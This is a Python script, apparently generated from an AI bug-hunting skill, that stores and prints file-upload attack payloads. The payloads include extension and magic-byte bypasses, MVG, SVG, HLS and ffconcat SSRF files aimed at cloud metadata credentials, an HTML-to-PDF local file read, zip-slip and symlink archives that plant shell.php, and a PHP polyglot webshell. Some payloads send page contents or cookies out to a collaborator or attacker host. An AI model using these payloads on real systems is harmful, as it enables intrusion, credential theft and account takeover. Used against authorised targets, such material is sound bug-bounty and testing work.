#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-file-upload

Skill: Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
Desc : Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples.

Run:  python claude-bughunter-hunt-file-upload.py --help
      python claude-bughunter-hunt-file-upload.py --list
      python claude-bughunter-hunt-file-upload.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-file-upload'
TITLE = 'Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)'
DESCRIPTION = 'Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples.'

PAYLOADS = {
    'main': ["name: hunt-file-upload", "description: \"Hunt file upload bugs \u2014 RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples.\""],
    '9-file-upload': [],
    'content-type-bypass': ["filename=shell.php, Content-Type: image/jpeg  \u2192 server trusts Content-Type", "filename=shell.phtml, shell.pHp, shell.php5   \u2192 extension variants"],
    'file-upload-bypass-techniques-10-techniques': [],
    'magic-bytes-reference': [],
    'stored-xss-via-svg': ["```xml", "<?xml version=\"1.0\"?>", "<svg xmlns=\"http://www.w3.org/2000/svg\">", "<script>alert(document.domain)</script>", "</svg>"],
    'imagemagick-ffmpeg-exploitation': [],
    'imagemagick-ssrf-file-read-imagetragick-family-modern-variants': ["```bash"],
    'upload-this-as-a-mvg-or-rename-to-jpg-png-magic-bytes-bypass': [],
    'mvg-ssrf-payload-fetches-internal-url-during-processing': ["cat > /tmp/ssrf.mvg << 'EOF'", "push graphic-context", "viewbox 0 0 640 480", "fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'", "pop graphic-context"],
    'svg-ssrf-imagemagick-processes-svg-remotely': ["cat > /tmp/ssrf.svg << 'EOF'", "<?xml version=\"1.0\"?>", "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>", "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">", "<image xlink:href=\"http://COLLAB_HOST/imagemagick-ssrf\" width=\"200\" height=\"200\"/>", "</svg>"],
    'webp-avif-processing-bugs-modern-surface-cve-2023-4863': [],
    'upload-a-crafted-webp-file-targeting-libwebp-heap-overflow': [],
    'use-https-github-com-mistymntncop-cve-2023-4863-poc': [],
    'ffmpeg-ssrf-via-hls-playlist': ["```bash"],
    'ffmpeg-processes-m3u8-playlists-and-fetches-referenced-segments': ["cat > /tmp/ssrf.m3u8 << 'EOF'", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
    'also-works-with-concat-demuxer': ["cat > /tmp/concat.txt << 'EOF'", "ffconcat version 1.0", "file 'http://COLLAB_HOST/ffmpeg-ssrf'"],
    'test-upload-m3u8-or-video-file-to-any-video-processing-endpoint': [],
    'headless-chrome-pdf-generator-ssrf': [],
    'html-pdf-converter-attacks': ["```bash"],
    'target-invoice-generators-report-exporters-screenshot-services': [],
    'inject-html-that-causes-headless-chrome-to-fetch-internal-resources': [],
    'ssrf-via-css-import': ["PAYLOAD='<html><head><style>@import url(\"http://169.254.169.254/latest/meta-data/\");</style></head><body>test</body></html>'"],
    'ssrf-via-html-iframe': ["PAYLOAD='<html><body><iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" width=\"1000\" height=\"1000\"></iframe></body></html>'"],
    'local-file-read': ["PAYLOAD='<html><body><iframe src=\"file:///etc/passwd\" width=\"1000\" height=\"1000\"></iframe></body></html>'"],
    'javascript-execution-if-sandbox-not-enforced': ["PAYLOAD='<html><body><script>", "fetch(\"http://COLLAB_HOST/chrome-rce?d=\" + encodeURIComponent(document.documentElement.innerHTML));", "</script></body></html>'"],
    'test-submit-html-to-any-generate-pdf-export-screenshot-report-endpoint': ["curl -s -X POST \"https://$TARGET/api/generate-pdf\" \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"html\\\": \\\"$PAYLOAD\\\"}\""],
    'archive-extraction-attacks-zip-slip-symlink': ["```bash"],
    'zip-slip-path-traversal-via-archive-filenames': ["pip3 install evilarc", "python3 evilarc.py shell.php -o unix -p \"../../../var/www/html/\" -d 5 -f /tmp/zipslip.zip"],
    'symlink-attack-archive-contains-symlink-to-sensitive-file': ["mkdir -p /tmp/sym_attack", "ln -s /etc/passwd /tmp/sym_attack/innocent.txt", "zip -ry /tmp/symlink.zip /tmp/sym_attack/"],
    'tar-symlink-attack': ["tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/"],
    'test-upload-to-any-import-extract-unzip-endpoint': ["curl -s -X POST \"https://$TARGET/api/import\" \\", "-F \"file=@/tmp/zipslip.zip\""],
    'related-skills-chains': ["- **`hunt-rce`** \u2014 File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist \u2192 `GET /uploads/shell.phtml?c=id` \u2192 RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path \u2192 PHP object deserialization \u2192 RCE.", "- **`hunt-xxe`** \u2014 Office formats (DOCX/XLSX/PPTX), SVGs, and SOAP attachments are XML inside a ZIP \u2014 every upload-and-parse feature is a latent XXE candidate. Chain primitive: upload DOCX whose `[Content_Types].xml` or `word/document.xml` includes a parameter-entity DTD pointing at attacker-controlled DTD \u2192 blind XXE OOB file read \u2192 exfil `/etc/passwd` or `web.config` via the document parser.", "- **`hunt-xss`** \u2014 SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch('//attacker/?'+document.cookie)</script>` \u2192 victim views attachment at `app.target.com/uploads/x.svg` (same origin, not sandboxed) \u2192 cookie theft \u2192 ATO via session hijack.", "- **`hunt-ssrf`** \u2014 Image-processing libraries (ImageMagick, ffmpeg) fetch remote URLs from inside the uploaded file. Chain primitive: upload an SVG/MVG with `<image xlink:href=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">` or ffmpeg `concat:http://internal/...` \u2192 SSRF to AWS IMDS \u2192 cloud creds; the ImageTragick CVE-2016-3714 family is still alive on legacy farms.", "- **`security-arsenal`** \u2014 Reach for the file-upload bypass tree: 10-row extension/MIME/magic-byte bypass table (double-ext, null-byte, case variants, `.phtml`/`.phar`/`.php5`/`.pht`, `.htaccess` upload to re-enable handlers, `web.config` upload on IIS), SVG/MVG/SVGZ payloads, DOCX-XXE templates, ZIP-slip path traversal in archives, polyglot generators.", "- **`triage-validation`** \u2014 Apply the Reproducibility Gate. A file successfully uploaded but never served, never executed, never parsed by anything is not a finding \u2014 it's a write-only blob. Critical RCE requires the actual `whoami` round-trip from the uploaded shell; stored XSS requires the popup firing in a victim browser, not just the file existing on disk."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()